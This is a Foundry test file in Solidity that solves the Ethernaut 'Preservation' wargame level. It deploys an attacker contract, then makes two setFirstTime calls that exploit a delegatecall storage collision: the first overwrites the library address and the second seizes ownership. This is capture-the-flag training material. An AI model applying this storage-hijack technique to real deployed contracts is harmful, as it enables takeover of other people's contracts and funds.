// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/16-Preservation/PreservationFactory.sol";
import "../src/16-Preservation/PreservationAttacker.sol";
import "../src/Ethernaut.sol";

contract PreservationTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testPreservationHack() public {
        // Level setup
        PreservationFactory preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(preservationFactory);
        Preservation ethernautPreservation = Preservation(payable(levelAddress));

        // Level attack
        PreservationAttacker attacker = new PreservationAttacker();
        // the first 20 bytes of uint256 need to be the attacker address
        uint timeWithAddress = uint256(uint160(address(attacker)));  // 0s added to the right
        emit log_named_address("attacker", address(attacker));
        emit log_named_bytes32("timeWithAddress", bytes32(timeWithAddress));
        ethernautPreservation.setFirstTime(timeWithAddress);
        emit log_named_address("new timeZone1Library", ethernautPreservation.timeZone1Library());
        // timeZone1Library address is now address of attacker, so now should pass uint256 with owner address
        timeWithAddress = uint256(uint160(eoaAddress));
        ethernautPreservation.setFirstTime(timeWithAddress);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}